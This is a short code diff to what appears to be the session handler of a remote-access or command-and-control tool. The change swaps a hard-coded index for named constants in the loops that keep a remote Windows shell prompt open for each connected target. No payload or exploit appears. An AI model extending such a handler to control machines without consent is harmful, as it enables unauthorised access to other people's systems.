@@ -12,6 +12,8 @@ from .other import recvall
 from .other import printColor
 from .management import CheckConn
 from .handler import Handler
+from .sql import Sql
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN
 
 class Session:
     #This class is called when the target is selected.
@@ -39,7 +41,7 @@ class Session:
        
         printColor("help","\n\n[?] Execute -b or --back to return to sessions mode.") 
         printColor("help","\r[?] Mod shell active, You can run windows commands.\n\n")
-        while Handler.dict_conn[self.session_nb][3]:
+        while Handler.dict_conn[self.session_nb][NB_ALIVE]:
             shell = str(input("Shell>"))
             if shell:
                 if(shell == "-b" or shell=="--back"):
@@ -65,7 +67,7 @@ class Session:
         printColor("help","\n[?] Run -h or --help to list the available commands.\n")
         #while Handler.dict_conn[self.session_nb][3]: #If connexion is always connected (True)
         checker = True
-        while Handler.dict_conn[self.session_nb][3] and checker: #If connexion is always connected (True)
+        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True)
             terminal = str(input("Session:"+ str(self.session_nb)+">")).split()
             for i in range(0,len(terminal)):
                 if terminal[i] == "-h" or terminal[i] == "--help":
